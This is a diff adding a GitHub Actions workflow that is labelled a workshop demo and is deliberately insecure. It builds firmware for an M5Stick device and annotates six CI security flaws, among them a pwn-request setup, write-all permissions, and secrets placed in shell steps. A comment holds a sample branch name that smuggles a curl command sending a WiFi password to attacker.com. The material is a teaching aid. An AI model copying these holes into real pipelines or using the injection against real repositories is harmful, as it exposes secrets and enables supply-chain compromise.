@@ -1,0 +1,74 @@
+# =============================================================================
+# WORKSHOP DEMO — intentionally vulnerable firmware build pipeline
+# DO NOT USE IN PRODUCTION
+#
+# Vulnerabilities present (zizmor audit rules triggered):
+#   1. dangerous-triggers      — pull_request_target with secrets in scope
+#   2. template-injection      — PR branch name injected raw into shell
+#   3. unpinned-uses           — mutable @v3 tags on all actions
+#   4. excessive-permissions   — write-all at workflow level
+#   5. secrets-outside-env     — secrets interpolated directly into run:
+#   6. artipacked              — checkout persists git credentials to artifact
+# =============================================================================
+
+name: Firmware build (VULNERABLE — workshop demo)
+
+on:
+  push:
+    branches: [main]
+  pull_request_target:                  # VULN 1: runs with base branch secrets
+    types: [opened, synchronize]        # even for fork PRs
+
+permissions: write-all                  # VULN 2: grants full repo write access
+
+jobs:
+  sast-and-build:
+    runs-on: ubuntu-latest
+
+    steps:
+      # VULN 3: @v3 tag is mutable — can be silently replaced after compromise
+      - name: Checkout code
+        uses: actions/checkout@v3
+        with:
+          # Checks out attacker-controlled code in base context (pwn request)
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Set up Python
+        uses: actions/setup-python@v4    # VULN 3: also unpinned
+
+      - name: Install PlatformIO
+        run: pip install platformio
+
+      # VULN 4: PR title and branch name flow directly into shell unquoted.
+      # Attacker names branch: x"; curl https://attacker.com?k=$WIFI_PASS; echo "
+      - name: Log build info
+        run: |
+          echo "Building PR: ${{ github.event.pull_request.title }}"
+          echo "Branch: ${{ github.event.pull_request.head.ref }}"
+          echo "Author: ${{ github.event.pull_request.user.login }}"
+
+      # VULN 5: Secrets interpolated directly into run: — visible in logs,
+      # exfiltrable by any step that runs before or after this one
+      - name: Write firmware secrets
+        run: |
+          echo '[env:m5stick-c-plus2]' >> platformio.ini
+          echo 'build_flags =' >> platformio.ini
+          echo '  -DWIFI_SSID=\"${{ secrets.WIFI_SSID }}\"' >> platformio.ini
+          echo '  -DWIFI_PASS=\"${{ secrets.WIFI_PASSWORD }}\"' >> platformio.ini
+          echo '  -DOTA_TOKEN=\"${{ secrets.OTA_SIGNING_TOKEN }}\"' >> platformio.ini
+
+      - name: Run SAST (clang-tidy via PlatformIO)
+        run: pio check --environment m5stick-c-plus2 --severity defect
+
+      - name: Build firmware
+        run: pio run --environment m5stick-c-plus2
+
+      # VULN 6: checkout@v3 persists git credentials in .git/config
+      # upload-artifact then bundles .git/ — credentials leak in the artifact
+      - name: Upload firmware binary
+        uses: actions/upload-artifact@v3   # VULN 3: also unpinned
+        with:
+          name: firmware-m5stick
+          path: |
+            .pio/build/m5stick-c-plus2/firmware.bin
+            .pio/build/m5stick-c-plus2/partitions.bin
